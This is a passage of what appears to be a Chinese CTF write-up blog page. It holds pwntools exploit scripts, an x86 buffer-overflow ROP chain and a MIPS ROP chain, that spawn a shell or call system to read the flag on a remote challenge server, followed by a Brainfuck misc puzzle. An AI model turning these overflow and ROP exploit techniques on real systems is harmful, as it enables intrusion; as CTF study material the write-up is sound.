shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>


p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4018e5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x405bcc</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04018FC</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>

sh<span class="token operator">=</span><span class="token number">0x6873</span>
<span class="token keyword">while</span> sh<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">"10000"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
        sh<span class="token operator">-=</span><span class="token number">10000</span>

sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"6739"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"cat flag 1>&amp;2"</span><span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="EZ-3-0"><a href="#EZ-3-0" class="headerlink" title="EZ 3.0"></a>EZ 3.0</h3><p>mips rop</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token number">0x00400a20</span> <span class="token punctuation">:</span> lw $a0<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span> <span class="token punctuation">;</span> lw $t9<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span> <span class="token punctuation">;</span> jalr $t9 <span class="token punctuation">;</span> nop</code></pre>

<p>这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成&#x2F;bin&#x2F;cat flag.txt，t9变成system</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process(["qemu-mipsel","-g","1234","./ez"])</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.15.198"</span><span class="token punctuation">,</span> <span class="token number">26720</span><span class="token punctuation">)</span>
<span class="token comment">#a=process("./ez")</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>a<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"mips"</span><span class="token punctuation">)</span>

cat<span class="token operator">=</span><span class="token number">0x0411010</span>
gadget<span class="token operator">=</span><span class="token number">0x00400a20</span>

<span class="token comment">#p="A"*(32+4*1)+p32(0x004009c8)</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>cat<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x400b70</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>cat<span class="token punctuation">)</span>
<span class="token comment">#pause()</span>

sa<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>+++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span></code></pre>

<p>BrainFuck，但是观察到没有 <code>.</code> 来输出，在每部分后加上即可</p>
<pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token 